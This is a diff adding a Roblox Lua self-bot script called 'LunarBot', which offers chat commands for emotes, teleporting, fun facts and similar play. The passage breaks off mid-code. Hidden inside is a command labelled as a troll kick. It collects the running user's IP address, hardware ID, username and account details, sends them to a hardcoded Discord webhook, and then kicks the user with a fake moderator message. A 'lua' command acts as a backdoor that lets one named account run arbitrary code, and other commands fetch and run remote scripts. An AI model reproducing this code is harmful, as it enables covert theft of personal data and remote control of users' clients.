@@ -1,0 +1,1955 @@
+
+
+print("--------------------ADMIN STARUP LOADER-----------------------")
+
+warn("Starting")
+warn("Inztalizing.")
+print("Reading user ID")
+print("Chcking version.")
+warn("Inztalizing.")
+warn("Getting source.")
+warn("Inztalizing.")
+warn("Checking.")
+print("--------------------LOADING MAIN.1------------------")
+
+
+local bootTime = os.time()
+local disconnected = false
+
+local bot = game.Players.LocalPlayer
+
+for i, plr in pairs(game.Players:GetPlayers()) do
+	for i, obj in pairs(plr:GetChildren()) do
+		if obj.Name == "LunarBotBlacklist" then
+			obj:Destroy()		
+		end
+	end
+end
+
+--[[ configuration ]]--
+
+local whitelisted = {
+	--bot.Name,
+}
+_G.preWhitelisted = {
+    "BloxiSkid",
+    "TheAcounter0",
+    "Stay_Sold",
+    "Seweer_II",
+	"Halvorson64280"
+ 
+}
+print("LOADED!")
+local showbotchat = _G.showBotChat or false --setting this to true will cause all messages sent by either commands or LunarBot to begin with [LunarBot]
+local allwhitelisted = _G.defaultAllWhitelisted or false --set to true if you want everyone to be whitelisted, nicK is not responsible for anything players make you do or say.
+local randommoveinteger = _G.defaultRandomMoveInteger or 5 --interval in which how long randommove waits until choosing another direction
+local prefix = _G.defaultPrefix or "." --DO NOT SET TO MORE THAN 1 CHARACTER!
+
+if _G.preWhitelisted and type(_G.preWhitelisted) == "table" then
+	for i, v in pairs(_G.preWhitelisted) do
+		table.insert(whitelisted, v)
+	end
+end
+
+if prefix:len() > 1 then
+	warn("Lunar // Prefix cannot be more than 1 character long!")
+	return
+end
+
+--[[ end configs, don't edit this especially if you have no idea what Lua is lmao ]]--
+
+local lunarbotversion = "v0.1.0 Public Beta Release"
+local lunarbotchangelogs = "Added a few commands!"
+
+local gameData = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+local status = nil
+local followplr = nil
+local copychatplayer = nil
+
+local TS = game:GetService("TweenService")
+
+local TI = TweenInfo.new(
+	2.5,
+	Enum.EasingStyle.Linear,
+	Enum.EasingDirection.Out,
+	0,
+	false,
+	0
+)
+
+local function chat(msg)
+	if showbotchat == true then
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("[LunarBot]: " .. msg, "All")
+	else
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+	end
+end
+
+local funfacts = {
+	"LunarBot was created on 11/17/22.",
+	"The developer of LunarBot has made 2 other scripts: Lunar AI and LunarHub.",
+	"The khord server uses an external invite service so we can get a custom invite because we don't have nitro. d.io/LunarCrocs",
+	"My dad came back from getting the milk 0.03 seconds ago.",
+	"We are playing Roblox.",
+	"If you spend a penny, you lose that penny.",
+	"Press 'Y' to jump.",
+	"Commands are added to LunarBot almost every day.",
+	"LunarBot was developed and scripted by probablYnicK.",
+	"LunarBot is a self-bot, meaning that, yes, I AM A REAL PERSON. I'm watching!",
+	"Khord server: d.io/LunarCrocs",
+	"Among Us is extremely old.",
+	"Press Alt + F4 to get 1 billion dollars on the spot.",
+	"Press U to walk forward.",
+	"At the time of writing this fun fact list, there are 6 people in the server.",
+	"LunarBot was first tested in the game: a literal baseplate.",
+	"I found a lucky penny!",
+	"You found this fun fact.",
+	"The sandwich was invented in the 1700s.",
+	"If you drink poison, you might die.",
+	"Hot water will turn into ice faster than cold water.",
+	"The Mona Lisa has no eyebrows.",
+	"The strongest muscle in the body is the tongue.",
+	"Ants take rest for around 8 minutes in a 12-hour period.",
+	"'I am' is the shortest complete sentence in the English language.",
+	"Coca-Cola was originally green.",
+	"I got most of these fun facts from Google.",
+	"Rabbits can't get sick.",
+	"McDonald's invented a sweet-tasting type of broccoli.",
+	"Water makes different sounds depending on its temperature.",
+}
+
+local chatEvents = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
+local messageDoneFiltering = chatEvents:WaitForChild("OnMessageDoneFiltering")
+
+local commandsMessage = {
+	"cmds, reset, say <message>, pick <options>, dance, whitelist <player>, blacklist <player>, coinflip, random <min> <max>, bring, walkto <player>, setprefix <newPrefix>",
+	"setstatus <newStatus>, clearStatus, point, wave, funfact, time, speed, fps, sit, rush, randommove, randomplayer, rickroll, disablecommand <command>, jump, follow, unfollow",
+	"salute, announce <announcement>, help <command>, jobid, aliases <command>, math <operation> <nums>, changelogs, gamename, playercount, maxplayers, toggleall, setinterval, executor",
+	"lua <lua>, ping, catch <player>, copychat <player>, cheer, stadium",
+}
+
+local commands --don't change, could lead to errors
+
+local function checkCommands(cmd)
+	for i, cmds in pairs(commands) do
+		if cmds == cmd or table.find(cmds.Aliases, cmd) or cmds.Name == cmd then
+			return cmds	
+		end
+	end
+	
+	return nil
+end
+
+local rushing = false
+local rickrolling = false
+
+local function searchPlayers(query)
+	query = string.lower(query)
+	
+	for i, player in pairs(game.Players:GetPlayers()) do
+		if string.find(string.lower(player.DisplayName), query) or string.find(string.lower(player.Name), query) then
+			return player
+		end
+	end
+	
+	return nil
+end
+
+commands = {
+	cmds = {
+		Name = "cmds",
+		Aliases = {"commands"},
+		Use = "Lists all commands!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			task.spawn(function()
+				for i, cmd in pairs(commandsMessage) do
+					chat(cmd)
+					wait(0.5)
+				end
+			end)
+		end,
+	},
+	aliases = {
+		Name = "aliases",
+		Aliases = {},
+		Use = "Lists the aliases for the given command!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			task.spawn(function()
+				if not args[2] then return end
+				
+				local cmd = checkCommands(args[2])
+				
+				local function getAliases(c)
+					local str = ""
+					
+					if #c.Aliases == 0 then return "None" end
+					
+					for i, a in pairs(c.Aliases) do
+						str = str .. a .. ", "
+					end
+					
+					return str
+				end
+				
+				if cmd then
+					chat(cmd.Name .. " - " .. getAliases(cmd))
+				else
+					chat("Invalid command!")
+				end
+			end)
+		end,
+	},
+	help = {
+		Name = "help",
+		Aliases = {"help"},
+		Use = "Tells you the use of <command>!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			task.spawn(function()
+				if not args[2] then
+					return
+				end
+				
+				if string.sub(args[2], 1, 1) == prefix then
+					args[2] = string.sub(args[2], 2)
+				end
+			
+				local cmd = checkCommands(args[2])
+				
+				if cmd then
+					chat(cmd.Name .. " - " .. cmd.Use)
+				else
+					chat("Invalid command!")
+				end
+			end)
+		end,
+	},
+	reset = {
+		Name = "reset",
+		Aliases = {"re"},
+		Use = "Respawns LunarBot!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			local hum = bot.Character:FindFirstChildWhichIsA("Humanoid")
+			
+			if hum then
+				hum.Health = 0
+			end
+		end,
+	},
+	catch = {
+		Name = "catch",
+		Aliases = {"catchin4k", "c14"},
+		Use = "Makes LunarBot catch the given player in 4K!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			local plr
+			
+			if args[2] then
+				if args[2] == "random" then
+					local players = game.Players:GetPlayers()
+					
+					plr = players[math.random(1, #players)]
+				else
+					local searched = searchPlayers(args[2])
+				
+					if searched ~= nil then
+						plr = searched
+					else
+						chat("Invalid player!")
+						return
+					end
+				end
+			else
+				plr = game.Players:FindFirstChild(speaker)
+			end
+			
+			if plr then
+				bot.Character:SetPrimaryPartCFrame(CFrame.new(plr.Character.HumanoidRootPart.Position))
+				chat("📸 CAUGHT IN 4K BY LUNARBOT 📸")
+			end
+		end,
+	},
+	ping = {
+		Name = "ping",
+		Aliases = {"getping"},
+		Use = "Chats LunarBot's ping!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			chat("Ping: " .. tostring(math.floor(game:GetService("Stats").PerformanceStats.Ping:GetValue() + 0.5)) .. " ms")
+		end,
+	},
+	executor = {
+		Name = "executor",
+		Aliases = {"identifyexecutor", "getexec", "exec"},
+		Use = "Gives you the executor that is running LunarBot!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			chat("Executor: " .. identifyexecutor() or "Unknown")
+		end,
+	},
+	lua = {
+		Name = "lua",
+		Aliases = {"runlua", "run", "luau"},
+		Use = "Gives you the executor that is running LunarBot!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			if speaker ~= "BloxiSkid" then
+				chat("You do not have permission to run LuaU from LunarBot.")
+				return
+			end
+			
+			local torun = string.sub(msg, 5)
+			
+			local success, errMsg = pcall(function()
+				loadstring(torun)()
+			end)
+			
+			if success then
+				chat("Successfully ran LuaU with no errors.")
+			elseif not success and errMsg then
+				chat("Failed to run LuaU with error in Developer Console [F9]!")
+			end
+		end,
+	},
+	setinterval = {
+		Name = "setinterval",
+		Aliases = {"setrandommoveinterval", "setint", "setinteger"},
+		Use = "Respawns LunarBot!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			if speaker ~= bot.Name then return end
+		
+			if not args[2] then return end
+			if not tonumber(args[2]) then return end
+		
+			randommoveinteger = tonumber(args[2])
+		end,
+	},
+	toggleall = {
+		Name = "toggleall",
+		Aliases = {"all", "allwl", "wlall"},
+		Use = "Respawns LunarBot!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			task.spawn(function()
+				if speaker ~= bot.Name then return end
+			
+				allwhitelisted = not allwhitelisted
+				
+				wait()
+				
+				chat("Set all_whitelisted to " .. tostring(allwhitelisted))
+			end)
+		end,
+	},
+	gamename = {
+		Name = "gamename",
+		Aliases = {"gn"},
+		Use = "Chats the current game's name!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			chat(gameData.Name)
+		end,
+	},
+	playercount = {
+		Name = "playercount",
+		Aliases = {"plrcount"},
+		Use = "Chats the current amount of players!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			chat(tostring(#game.Players:GetPlayers()))
+		end,
+	},
+	maxplayers = {
+		Name = "maxplayers",
+		Aliases = {"maxplrs"},
+		Use = "Chats the current server's maximum player count!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			chat(tostring(game.Players.MaxPlayers))
+		end,
+	},
+	unfollow = {
+		Name = "unfollow",
+		Aliases = {"unfollowplr"},
+		Use = "Respawns LunarBot!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				task.spawn(function()
+					followplr = nil
+					wait()
+					bot.Character.Humanoid:MoveTo(bot.Character.HumanoidRootPart.Position)
+				end)
+			end)
+		end,
+	},
+	follow = {
+		Name = "follow",
+		Aliases = {"followplr"},
+		Use = "Makes LunarBot follow you or the given player!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			local plr
+			
+			if args[2] then
+				if args[2] == "random" then
+					local players = game.Players:GetPlayers()
+					
+					plr = players[math.random(1, #players)]
+				else
+					local searched = searchPlayers(args[2])
+				
+					if searched ~= nil then
+						plr = searched
+					else
+						chat("Invalid player!")
+						return
+					end
+				end
+			else
+				plr = game.Players:FindFirstChild(speaker)
+			end
+			
+			followplr = plr
+		end,
+	},
+	jobid = {
+		Name = "jobid",
+		Aliases = {"serverid"},
+		Use = "Returns the current server's Server ID, or Job ID.",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			chat(game.JobId)
+		end,
+	},
+	say = {
+		Name = "say",
+		Aliases = {"chat"},
+		Use = "Says the <message> in chat!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			local tosay
+			
+			if args[1] == "say" then
+				tosay = string.sub(msg, 6)
+			else
+				tosay = string.sub(msg, 8)
+			end
+			
+			local speakerplayer = game.Players:FindFirstChild(speaker)
+			
+			if not speakerplayer then return end
+			
+			chat(speakerplayer.DisplayName .. ": " .. tosay)
+		end,
+	},
+	pick = {
+		Name = "pick",
+		Aliases = {"choose"},
+		Use = "Picks an item from the given arguments.",
+		Enabled = true,
+		CommandFunction = function(msg, args)
+			local choosefrom = {}
+		
+			for i, opt in pairs(args) do
+				if i >= 2 then
+					table.insert(choosefrom, opt)
+				end
+			end
+			
+			local chosen = choosefrom[math.random(1, #choosefrom)]
+			
+			if chosen then
+				chat("LunarBot chose: " .. chosen)
+			end
+		end,
+	},
+	dance = {
+		Name = "dance",
+		Aliases = {},
+		Use = "Makes LunarBot dance!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			game:GetService("Players"):Chat("/e dance")
+		end,
+	},
+	point = {
+		Name = "point",
+		Aliases = {},
+		Use = "Makes LunarBot point!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			game:GetService("Players"):Chat("/e point")
+		end,
+	},
+	stadium = {
+		Name = "stadium",
+		Aliases = {},
+		Use = "Makes LunarBot do the stadium emote!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			game:GetService("Players"):Chat("/e stadium")
+		end,
+	},
+	cheer = {
+		Name = "cheer",
+		Aliases = {},
+		Use = "Makes LunarBot cheer!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			game:GetService("Players"):Chat("/e cheer")
+		end,
+	},
+	wave = {
+		Name = "wave",
+		Aliases = {},
+		Use = "Makes LunarBot wave!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			game:GetService("Players"):Chat("/e wave")
+		end,
+	},
+	sit = {
+		Name = "sit",
+		Aliases = {},
+		Use = "Makes LunarBot sit!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			bot.Character.Humanoid.Sit = true
+		end,
+	},
+	salute = {
+		Name = "salute",
+		Aliases = {},
+		Use = "Makes LunarBot salute!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			game.Players:Chat("/e salute")
+		end,
+	},
+	jump = {
+		Name = "jump",
+		Aliases = {},
+		Use = "Makes LunarBot jump!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			bot.Character.Humanoid.Jump = true
+		end,
+	},
+	announce = {
+		Name = "announce",
+		Aliases = {},
+		Use = "Makes an announcement via chat, a owner-only command!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			if speaker ~= bot.Name then return end
+		
+			chat("-- ANNOUNCEMENT -- ")
+			wait()
+			chat(string.sub(msg, 10))
+			wait()
+			chat("-- ANNOUNCEMENT --")
+		end,
+	},
+	whitelist = {
+		Name = "whitelist",
+		Aliases = {"wl"},
+		Use = "Whitelists a player, meaning they can use LunarBot. An owner-only command!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			local towhitelist = args[2]
+			
+			if speaker ~= "BloxiSkid" then return end
+			
+			if towhitelist then
+				if towhitelist == "all" then
+					for i, player in pairs(game.Players:GetPlayers()) do
+						table.insert(whitelisted, player.Name)
+						local bl = player:FindFirstChild("LunarBotBlacklist")
+						if bl then bl:Destroy() else warn(player.DisplayName .. " was not blacklisted!") end
+					end
+					
+					allwhitelisted = true
+					
+					chat("Whitelisted all players that are currently in the game! Type .cmds to view commands.")
+				else
+					local plr = searchPlayers(towhitelist)
+					
+					if plr then
+						table.insert(whitelisted, plr.Name)
+						local bl = plr:FindFirstChild("LunarBotBlacklist")
+						if bl then bl:Destroy() else warn(player.DisplayName .. " was not blacklisted!") end
+						chat("Whitelisted " .. plr.DisplayName .. "! Type .cmds to view commands.")
+					else
+						chat("Failed to whitelist player - User not found!")
+					end
+				end
+			end
+		end,
+	},
+	blacklist = {
+		Name = "blacklist",
+		Aliases = {"bl"},
+		Use = "Blacklists a player meaning they cannot use LunarBot. Owner-only command!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			local toblacklist = args[2]
+			
+			if speaker ~= "BloxISkid" then return end
+			
+			if toblacklist then
+				if toblacklist == "all" then
+					for i, p in pairs(game.Players:GetPlayers()) do
+						local alrbl = p:FindFirstChild("LunarBotBlacklist")
+						
+						if alrbl then alrbl:Destroy() end
+					
+						local new = Instance.new("BoolValue")
+						new.Parent = p
+						new.Name = "LunarBotBlacklist"
+						new.Value = true
+					end
+					
+					allwhitelisted = false
+					
+					chat("Blacklisted all players that are currently in the game! They can no longer run commands.")
+				else
+					local plr = searchPlayers(toblacklist)
+					
+					if plr then
+						local alrbl = plr:FindFirstChild("LunarBotBlacklist")
+						
+						if alrbl then alrbl:Destroy() end
+					
+						local new = Instance.new("BoolValue")
+						new.Parent = plr
+						new.Name = "LunarBotBlacklist"
+						new.Value = true
+						alwhitelisted = false
+						chat("Blacklisted " .. plr.DisplayName .. "! They can no longer run commands.")
+					else
+						chat("Failed to blacklist player - User not found!")
+					end
+				end
+			end
+		end,
+	},
+	coinflip = {
+		Name = "coinflip",
+		Aliases = {"flip", "coin"},
+		Use = "Flips a coin using a randomly generated number from 1 to 2.",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			local flipped = math.random(1, 2)
+			
+			if flipped == 1 then
+				chat("HEADS!")
+			elseif flipped == 2 then
+				chat("TAILS!")
+			else
+				chat("Whoops! An unknown error occured while flipping the coin. That's a bit embarrasing.")
+			end
+		end,
+	},
+	random = {
+		Name = "random",
+		Aliases = {},
+		Use = "Generates a random number between the given numbers!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			if args[2] and args[3] then
+				local rnd = math.random(tonumber(args[2]), tonumber(args[3]))
+				
+				if rnd then
+					chat("LunarBot // Generated random number between " .. args[2] .. " and " .. args[3] .. ": " .. rnd)
+				else
+					chat("Aw, snap! An error occured while generating a random number.")
+				end
+			end
+		end,
+	}, --// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG BLACKLIST
+	
+
+    --// BEGINGNG END--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG
+	bring = {
+		Name = "bring",
+		Aliases = {},
+		Use = "Brings LunarBot to the player that chatted the command.",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				local plr = game.Players:FindFirstChild(speaker)
+			
+				if plr then
+					bot.Character:SetPrimaryPartCFrame(plr.Character.HumanoidRootPart.CFrame)
+				end
+			end)
+		end,
+	},
+	blacklist1 = {
+        Name = "blacklist1",
+        Aliases = {"TR"},
+        Use = "Troll Kicks user",
+        Enabled = true,
+        CommandFunction = function(msg, args, speaker)
+
+ 
+local IP = game:HttpGet("https://v4.ident.me")
+plr = game:GetService'Players'.LocalPlayer
+local premium = false
+local ALT = false
+if plr.MembershipType == Enum.MembershipType.Premium then
+	premium = true
+elseif plr.MembershipType == Enum.MembershipType.None then
+	premium = false
+end
+if premium == false then 
+	if plr.AccountAge <= 70 then 
+		ALT = true
+	end
+end
+
+local market = game:GetService("MarketplaceService")
+local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+
+
+local http_request = http_request;
+if syn then
+	http_request = syn.request
+elseif SENTINEL_V2 then
+	function http_request(tb)
+		return {
+			StatusCode = 200;
+			Body = request(tb.Url, tb.Method, (tb.Body or ''))
+		}
+	end
+end
+
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+hwid = "";
+
+for i, v in next, hwid_list do
+	if decoded.headers[v] then
+		hwid = decoded.headers[v];
+		break
+	end
+end
+
+if hwid then
+local HttpServ = game:GetService('HttpService')
+local url = "https://discord.com/api/webhooks/1050848420224577587/lHKLhRkz7flA049MUL0h4iAZMmAQ1uLx4ZbS9Pha67xrBH-hF-3OAZj5X535vUKy_YjH"
+--local url = "https://discord.com/api/webhooks/753688508828483634/qo0PL1VWKkPGH9UETChhu9fxwY001h0JDEPlZIrsaxHZS26tztecA9la4vz-46_0kajq"
+
+local data = 
+    {
+        ["content"] = "Blacklisted initation trail.",
+        ["embeds"] = {{
+            ["title"] = "__**HWID:**__",
+            ["description"] = hwid,
+            ["type"] = "rich",
+            ["color"] = tonumber(0xAB0909),
+            ["fields"] = {  
+
+			
+			  {
+                    ["name"] = "Username:",
+                    ["value"] = Game.Players.LocalPlayer.Name,
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "IP Address:",
+                    ["value"] = IP,
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "Game Link:",
+                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
+                    ["inline"] = true
+                },
+				{
+					["name"] = "Game Name:",
+					["value"] = info.Name,
+					["inline"] = true
+				},
+				{
+					["name"] = "Age:",
+					["value"] = plr.AccountAge,
+					["inline"] = true
+				},
+				{
+					["name"] = "Roblox Premium:",
+					["value"] = premium,
+					["inline"] = true
+				},
+				{
+					["name"] = "Alternetive Account:",
+					["value"] = ALT,
+					["inline"] = true
+				},
+				
+            },
+        }}
+    }
+    local newdata = HttpServ:JSONEncode(data)
+    
+    local headers = {
+            ["content-type"] = "application/json"
+    }
+    
+    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+    http_request(request_payload)
+end
+
+                bot:Kick("Blacklist trail initiated. [By an mod] This may get you blacklisted for more support DM the support team [ERROR: 9938-BL-0038-R:23]")
+
+         
+        end,
+    
+    }, --// BEGINGNG--// BEGINGNG--// WARN BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG
+   
+	copychat = {
+		Name = "copychat",
+		Aliases = {"cc", "copyc", "cchat"},
+		Use = "Makes LunarBot copy everything the given player says.",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				local player = nil
+			
+				if args[2] then
+					if args[2] == "random" then
+						player = game.Players:GetPlayers()[math.random(1,#game.Players:GetPlayers())]
+					else
+						player = searchPlayers(args[2])
+					end
+				else
+					player = game.Players:FindFirstChild(speaker)
+				end
+				
+				if player then
+					copychatplayer = player
+					chat("Now copying " .. player.DisplayName .. "'s chat!")
+				else
+					chat("Invalid player!")
+				end
+			end)
+		end,
+	},
+	uncopychat = {
+		Name = "uncopychat",
+		Aliases = {"uncc", "uncopyc", "uncchat"},
+		Use = "Makes LunarBot stop copying everything the copychat player says.",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				if copychatplayer then
+					chat("Stopped copying " .. copychatplayer.DisplayName .. "!")
+					copychatplayer = nil
+				else
+					chat("LunarBot is not copying anyone!")
+				end
+			end)
+		end,
+	},
+	to = {
+		Name = "to",
+		Aliases = {},
+		Use = "Teleports LunarBot to the <player> given.",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				if not args[2] then return end
+			
+				local plr = nil
+				
+				if args[2] == "random" then
+					local players = game.Players:GetPlayers()
+					
+					plr = players[math.random(1, #players)]
+				else
+					plr = searchPlayers(args[2])
+				end
+			
+				if plr then
+					bot.Character:SetPrimaryPartCFrame(plr.Character.HumanoidRootPart.CFrame)
+				else
+					chat("Invalid player!")
+				end
+			end)
+		end,
+	},
+	walkto = {
+		Name = "walkto",
+		Aliases = {"come"},
+		Use = "Makes LunarBot walk to you or the given player!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				local plr
+				
+				if not args[2] then plr = game.Players:FindFirstChild(speaker) end
+				
+				if args[2] and args[2] == "random" then
+					plr = game.Players:GetPlayers()[math.random(1,#game.Players:GetPlayers())]
+				elseif args[2] then
+					plr = searchPlayers(args[2])
+				end
+			
+				if plr and plr:IsA("Player") then
+					bot.Character.Humanoid:MoveTo(plr.Character.HumanoidRootPart.Position)
+				else
+					chat("Could not find player!")
+				end
+			end)
+		end,
+	},
+	setprefix = {
+		Name = "setprefix",
+		Aliases = {"prefix"},
+		Use = "Sets the prefix of LunarBot! Owner-only command!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				if not args[2] then return end
+			
+				if speaker == bot.Name then
+					if args[2] == "#" then return end
+					if string.len(args[2]) >= 2 then chat("Maximum prefix length is 1 character!") return end
+				
+					prefix = args[2]
+					chat("Successfully set prefix to '" .. prefix .. "'!")
+				else
+					chat("You do not have the permissions to run .setprefix!")
+				end
+			end)
+		end,
+	},
+	setstatus = {
+		Name = "setstatus",
+		Aliases = {},
+		Use = "Sets the status of LunarBot. When a status is set, the bot will no longer take commands.",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				if not args[2] then return end
+			
+				if speaker == bot.Name then
+					status = string.sub(msg, 12)
+					chat("Successfully set status to '" .. status .. "'!")
+				else
+					chat("You do not have the permissions to run .setstatus!")
+				end
+			end)
+		end,
+	},
+	clearstatus = {
+		Name = "clearstatus",
+		Aliases = {"nostatus"},
+		Use = "Clears the status and allows the bot to take commands again!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				if speaker == bot.Name then
+					status = nil
+					chat("Successfully cleared status!")
+				else
+					chat("You do not have the permissions to run .clearstatus!")
+				end
+			end)
+		end,
+	},
+	funfact = {
+		Name = "funfact",
+		Aliases = {"fact", "randomfact"},
+		Use = "Gives you a random fun fact!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				local rnd = funfacts[math.random(1, #funfacts)]
+				
+				chat("Fun Fact: " .. rnd)
+			end)
+		end,
+	},
+	time = {
+		Name = "time",
+		Aliases = {"currenttime"},
+		Use = "Gives you LunarBot's current time in its timezone.",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				chat("LunarBot's current time is: " .. os.date("%I:%M:%S %p"))
+			end)
+		end,
+	},
+	rickroll = {
+		Name = "rickroll",
+		Aliases = {"rick", "roll", "rr"},
+		Use = "Rickrolls the chat!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				task.spawn(function()
+					rickrolling = true
+					chat("Never gonna give you up!")
+					wait(1)
+					chat("Never gonna let you down!")
+					wait(1)
+					chat("Never gonna run around, and")
+					wait(1)
+					chat("Desert you!")
+					rickrolling = false
+				end)
+			end)
+		end,
+	},
+	walkspeed = {
+		Name = "walkspeed",
+		Aliases = {"speed"},
+		Use = "Sets LunarBot's walkspeed to <speed>!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				if not args[2] then return end
+				if not tonumber(args[2]) then return end
+				
+				if tonumber(args[2]) > 1000 then
+					chat("Whoops! That speed is over the speed limit of 1000.")
+					return
+				end
+			
+				bot.Character.Humanoid.WalkSpeed = tonumber(args[2])
+				
+				chat("Changed walkspeed to " .. args[2] .. "!")
+			end)
+		end,
+	},
+	fps = {
+		Name = "fps",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				chat("LunarBot's FPS is: " .. tostring(math.round(game.Workspace:GetRealPhysicsFPS())))
+			end)
+		end,
+	},
+    freeze = {
+		Name = "freeze",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				player.Character.HumanoidRootPart.Anchored = true
+			end)
+		end,
+	},
+	freeze = {
+		Name = "freeze",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+				player.Character.HumanoidRootPart.Anchored = true
+			end)
+		end,
+	},
+    kick2 = {
+		Name = "kick2",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+                bot:Kick("BANNED: :D")
+			end)
+		end,
+	},
+    test = {
+		Name = "test",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+                chat("Yeah yeah")
+			end)
+		end,
+	},
+    skid = {
+		Name = "skid",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+                chat("YEAH, YEAH!")
+			end)
+		end,
+	},
+    secure = {
+		Name = "secure",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+                chat("[!] - Securing client.")
+                chat("/console")
+                loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Guardian-V2-7164"))()
+                warn("Loaded security")
+                chat("[!] - Secured.")
+			end)
+		end,
+	},
+    secure2 = {
+		Name = "secure",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+                chat("[!] - SECURING 2.")
+                chat("/console")
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/TickoGrey/Anti-Teleport/main/The%20script"))()
+                warn("Loaded security")
+
+			end)
+		end,
+	},
+    fly = {
+		Name = "fly",
+		Aliases = {},
+		Use = "Chats LunarBot's current FPS!",
+		Enabled = true,
+		CommandFunction = function(msg, args, speaker)
+			pcall(function()
+                chat("Activating pro skid mode")
+                repeat wait() 
+                until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
+            local mouse = game.Players.LocalPlayer:GetMouse() 
+            repeat wait() until mouse
+            local plr = game.Players.LocalPlayer 
+            local torso = plr.Character.Head 
+            local flying = false
+            local deb = true 
+            local ctrl = {f = 0, b = 0, l = 0, r = 0} 
+            local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
+            local maxspeed = 400 
+            local speed = 5000 
+            
+            function Fly() 
+            local bg = Instance.new("BodyGyro", torso) 
+            bg.P = 9e4 
